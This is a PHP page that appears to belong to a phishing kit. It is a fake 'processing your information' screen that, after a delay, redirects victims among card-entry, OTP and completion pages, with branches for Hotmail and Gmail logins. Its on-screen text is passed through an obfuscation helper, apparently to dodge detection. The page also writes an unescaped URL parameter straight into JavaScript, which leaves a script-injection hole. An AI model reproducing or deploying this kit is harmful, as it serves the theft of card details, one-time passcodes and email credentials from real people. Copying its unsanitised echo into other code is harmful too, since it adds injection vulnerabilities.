<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en" class="h-100">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="res/css/style.css">
    <link rel="stylesheet" href="res/css/media.css">
    <script src="res/cdn/jq.js"></script>
</head>
<body class="h-100">
    
<div class="container text-center d-flex h-100 align-items-center justify-content-center">
<div>
<img src="res/img/logo.svg">
<p class="my-5"><?php $obf->obf("Processing your information..."); ?><br> <?php $obf->obf("do not close this page"); ?></p>
<p><img src="res/img/loading.gif" style="width:50px;"></p>
</div>
</div>
 
<script>
 
switch("<?php echo @$_GET['p'];?>"){

    case "CARD":
        go("otp.php");
    break;

    case "OTP":
        go("otp.php?e=ERROR");
    break;

    case "HOTMAIL":
        go("done.php");
    break;

    case "GMAIL":
        go("done.php");
    break;

    default:
        go("card.php?e=ERROR");
    break;

}


function go(target){
    setTimeout(() => {
        window.location=target;
    }, <?php echo $waiting_seconds*1000; ?>);
}


 

</script>
</body>
</html>